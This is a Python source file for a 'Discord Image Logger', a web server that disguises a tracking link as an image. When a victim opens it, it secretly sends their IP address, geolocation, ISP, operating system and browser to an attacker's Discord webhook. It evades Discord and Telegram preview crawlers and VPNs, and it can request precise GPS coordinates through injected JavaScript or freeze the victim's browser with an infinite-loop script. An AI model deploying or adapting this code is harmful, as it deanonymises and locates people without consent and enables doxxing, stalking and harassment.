# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1197617153130639490/ymhRJsdo0g27pszDRPR9iPBwUvFRl7ZV7OQGidzyihYZVNrPRXdNe2UzTsKQkq6oIK8y",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.reddit.com%2Fr%2FMeatCanyon%2Fcomments%2Ftxeyqm%2Fsome_random_fat_guy_i_drew_from_tiktok%2F&psig=AOvVaw3ssrCHUTOzSXKl5oFF2FwG&ust=1720109542000000&source=images&cd=vfe&opi=89978449&ved=0CBEQjRxqFwoTCICZ3sihi4cDFQAAAAAdAAAAABAE" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
